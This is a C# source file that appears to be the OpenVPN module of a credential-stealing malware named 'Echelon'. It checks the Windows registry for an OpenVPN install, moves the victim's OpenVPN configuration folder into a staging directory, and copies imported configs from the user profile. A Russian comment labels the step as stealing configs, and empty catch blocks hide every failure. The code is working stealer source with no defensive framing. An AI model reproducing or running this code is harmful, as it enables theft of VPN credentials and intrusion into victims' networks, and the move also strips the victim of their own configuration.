

using System.IO;
using Microsoft.Win32;

namespace Echelon
{
    internal class OpenVPN
    {
        public static int count;

        public static void GetOpenVPN(string Echelon_Dir)
        {
                try
                {
                var localMachineKey = Registry.LocalMachine;
                    var names = localMachineKey.OpenSubKey("SOFTWARE").GetSubKeyNames();
                    foreach (var i in names)
                        if (i == "OpenVPN")
                        {
                            Directory.CreateDirectory(Echelon_Dir + "\\VPN\\OpenVPN");
                            try
                            {
                                var dir = localMachineKey.OpenSubKey("SOFTWARE").OpenSubKey("OpenVPN").GetValue("config_dir").ToString();
                                var dire = new DirectoryInfo(dir);
                                dire.MoveTo(Echelon_Dir + "\\VPN\\OpenVPN");
                                count++;
                            }
                            catch {}

                        }
                }
                catch  {}
            //Стиллинг импортированных конфигов *New
            try
            {
                var dir = Help.UserProfile + "\\OpenVPN\\config\\conf\\";
                if (Directory.Exists(dir))
                {
                    foreach (var file in new DirectoryInfo(dir).GetFiles())

                    {
                        Directory.CreateDirectory(Echelon_Dir + "\\VPN\\OpenVPN\\config\\conf\\");
                        file.CopyTo(Echelon_Dir + "\\VPN\\OpenVPN\\config\\conf\\" + file.Name);
                    }
                    count++;
                }
            }
            catch  {}

        }
    }
}
